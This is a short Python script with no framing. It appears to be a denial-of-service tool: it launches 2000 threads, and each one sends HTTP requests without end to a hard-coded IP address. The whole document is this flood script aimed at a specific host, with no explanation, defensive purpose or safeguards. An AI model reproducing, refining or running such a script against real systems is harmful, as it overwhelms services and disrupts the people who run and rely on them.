import threading, os, socket, urllib.request

thread = 2000
url = "157.164.1.67"

def ping(url):
    while True:
        ip = socket.gethostbyname(url)
        page = urllib.request.urlopen("http://"+ip)
        page.read()
for i in range(thread):
    print('Starting Thread #'+str(i))
    t = threading.Thread(target=ping, args=(url,))
    t.start()

